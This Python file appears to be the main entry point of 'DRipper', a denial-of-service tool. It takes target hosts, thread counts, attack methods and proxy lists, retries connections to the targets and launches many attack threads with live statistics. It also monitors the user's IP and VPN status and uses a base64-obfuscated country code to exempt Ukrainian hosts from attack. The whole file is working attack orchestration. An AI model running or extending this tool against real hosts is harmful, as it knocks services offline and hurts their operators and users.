# XXX Services look like unstructured junk-box
import datetime
import signal
import sys
import threading
import time
from base64 import b64decode
from rich.live import Live

from ripper import common, arg_parser
from ripper.actions.attack import Attack, attack_method_labels
from ripper.constants import *
from ripper.context.context import Context
from ripper.context.target import Target
from ripper.common import get_current_ip
from ripper.proxy import Proxy
from ripper.errors import *

exit_event = threading.Event()
lock = threading.Lock()
_global_ctx: Context = None


###############################################
# Target-only
###############################################
def update_host_statuses(target: Target):
    """Updates host statuses based on check-host.net nodes."""
    diff = float('inf')
    if target.health_check_manager.last_host_statuses_update is not None:
        diff = time.time() - datetime.datetime.timestamp(target.health_check_manager.last_host_statuses_update)

    if target.health_check_manager.fetching_host_statuses_in_progress or diff < MIN_UPDATE_HOST_STATUSES_TIMEOUT:
        return
    target.health_check_manager.fetching_host_statuses_in_progress = True
    try:
        if target.host_ip:
            host_statuses = target.health_check_manager.fetch_host_statuses()
            # API in some cases returns 403, so we can't update statuses
            if len(host_statuses.values()):
                target.health_check_manager.host_statuses = host_statuses
                target.health_check_manager.last_host_statuses_update = datetime.datetime.now()
    except:
        pass
    finally:
        target.health_check_manager.fetching_host_statuses_in_progress = False


###############################################
# Context-only
###############################################
def update_current_ip(_ctx: Context, check_period_sec: int = 0) -> None:
    """Updates current IPv4 address."""
    if _ctx.check_timer(check_period_sec, 'update_current_ip'):
        _ctx.myIpInfo.my_current_ip = get_current_ip()
    if _ctx.myIpInfo.my_start_ip is None:
        _ctx.myIpInfo.my_start_ip = _ctx.myIpInfo.my_current_ip


def go_home(_ctx: Context) -> None:
    """Modifies host to match the rules."""
    home_code = b64decode('dWE=').decode('utf-8')
    for target in _ctx.targets:
        if target.host.endswith('.' + home_code.lower()) or common.get_country_by_ipv4(target.host_ip) in home_code.upper():
            target.host_ip = target.host = 'localhost'
            target.host += '*'


def refresh_context_details(_ctx: Context) -> None:
    """Check threads, IPs, VPN status, etc."""
    lock.acquire()

    threading.Thread(
        target=update_current_ip,
        args=[_ctx, UPDATE_CURRENT_IP_CHECK_PERIOD_SEC]).start()

    if _ctx.is_health_check:
        for target in _ctx.targets:
            threading.Thread(target=update_host_statuses, args=[target]).start()

    if _ctx.myIpInfo.my_country == GEOIP_NOT_DEFINED:
        threading.Thread(target=common.get_country_by_ipv4, args=[_ctx.myIpInfo.my_current_ip]).start()

    for target in _ctx.targets:
        if target.country == GEOIP_NOT_DEFINED:
            threading.Thread(target=common.get_country_by_ipv4, args=[target.host_ip]).start()

    lock.release()

    # Check for my IPv4 wasn't changed (if no proxylist only)
    if _ctx.proxy_manager.proxy_list_initial_len == 0 and common.is_my_ip_changed(_ctx.myIpInfo.my_start_ip, _ctx.myIpInfo.my_current_ip):
        _ctx.errors_manager.add_error(IPWasChangedError())

    for target in _ctx.targets:
        if not target.validate_attack():
            target.errors_manager.add_error(HostDoesNotRespondError(message=common.get_no_successful_connection_die_msg()))
            # TODO !!! Remove target instead of doing exit, exit when no more targets left
            exit(common.get_no_successful_connection_die_msg())

    if _ctx.proxy_manager.proxy_list_initial_len > 0 and len(_ctx.proxy_manager.proxy_list) == 0:
        _ctx.errors_manager.add_error(HostDoesNotRespondError(message=NO_MORE_PROXIES_ERR_MSG))
        exit(NO_MORE_PROXIES_ERR_MSG)


###############################################
# Target+Context
###############################################
def connect_host(target: Target, _ctx: Context, proxy: Proxy = None) -> bool:
    target.stats.connect.set_state_in_progress()
    try:
        sock = _ctx.sock_manager.create_tcp_socket(proxy)
        sock.connect((target.host, target.port))
    except:
        res = False
        target.stats.connect.failed += 1
    else:
        res = True
        target.stats.connect.success += 1
        sock.close()
    target.stats.connect.set_state_is_connected()
    return res


def connect_host_loop(target: Target, _ctx: Context, retry_cnt: int = CONNECT_TO_HOST_MAX_RETRY, timeout_secs: int = 3) -> None:
    """Tries to connect host in permanent loop."""
    i = 0
    _ctx.logger.rule('[bold]Starting DRipper')
    while i < retry_cnt:
        _ctx.logger.log(f'({i + 1}/{retry_cnt}) Trying connect to {target.host}:{target.port}...')
        if connect_host(target=target, _ctx=_ctx):
            _ctx.logger.rule()
            break
        time.sleep(timeout_secs)
        i += 1


###############################################
# Console
###############################################
def validate_input(args) -> bool:
    """Validates input params."""
    for target_uri in args.targets:
        if not Target.validate_format(target_uri):
            print(f'Wrong target format in {target_uri}.')
            return False

    if int(args.threads) < 1:
        print(f'Wrong threads number.')
        return False

    if args.attack_method is not None and args.attack_method.lower() not in attack_method_labels:
        print(f'Wrong attack type. Possible options: {", ".join(attack_method_labels)}.')
        return False

    if args.http_method and args.http_method.lower() not in ('get', 'post', 'head', 'put', 'delete', 'trace', 'connect', 'options', 'patch'):
        print(f'Wrong HTTP method type. Possible options: get, post, head, put, delete, trace, connect, options, patch.')
        return False

    if args.proxy_type and args.proxy_type.lower() not in ('http', 'socks5', 'socks4'):
        print(f'Wrong proxy type. Possible options: http, socks5, socks4.')
        return False

    return True


def render_statistics(_ctx: Context) -> None:
    """Show DRipper runtime statistics."""
    with Live(_ctx.stats.build_stats(), vertical_overflow='visible', redirect_stderr=False) as live:
        live.start()
        while True:
            time.sleep(0.5)
            refresh_context_details(_ctx)
            live.update(_ctx.stats.build_stats())
            if _ctx.dry_run:
                break


def main():
    """The main function to run the script from the command line."""
    args = arg_parser.create_parser().parse_args()

    if len(sys.argv) < 2 or not validate_input(args[0]):
        arg_parser.print_usage()

    # Init context
    global _global_ctx
    _global_ctx = Context(args[0])
    go_home(_global_ctx)
    # Proxies should be validated during the runtime
    for target in _global_ctx.targets:
        retry_cnt = 1 if _global_ctx.proxy_manager.proxy_list_initial_len > 0 or target.attack_method == 'udp' else 3
        connect_host_loop(_ctx=_global_ctx, target=target, retry_cnt=retry_cnt)
    _global_ctx.validate()

    time.sleep(.5)
    threads_range = _global_ctx.threads if not _global_ctx.dry_run else 1
    for _ in range(threads_range):
        Attack(_global_ctx).start()

    render_statistics(_global_ctx)


def signal_handler(signum, frame):
    """Signal handler for gracefully shutdown threads by keyboard interrupting."""
    exit_event.set()
    raise KeyboardInterrupt


def cli():
    try:
        signal.signal(signal.SIGINT, signal_handler)
        sys.exit(main())
    except KeyboardInterrupt:  # The user hit Control-C
        sys.stderr.write('\n\nReceived keyboard interrupt, terminating.\n\n')
        sys.stderr.flush()
        # Control-C is fatal error signal 2, for more see
        # https://tldp.org/LDP/abs/html/exitcodes.html
        sys.exit(128 + signal.SIGINT)
    except RuntimeError as exc:
        sys.stderr.write(f'\n{exc}\n\n')
        sys.stderr.flush()
        sys.exit(1)


if __name__ == '__main__':
    cli()
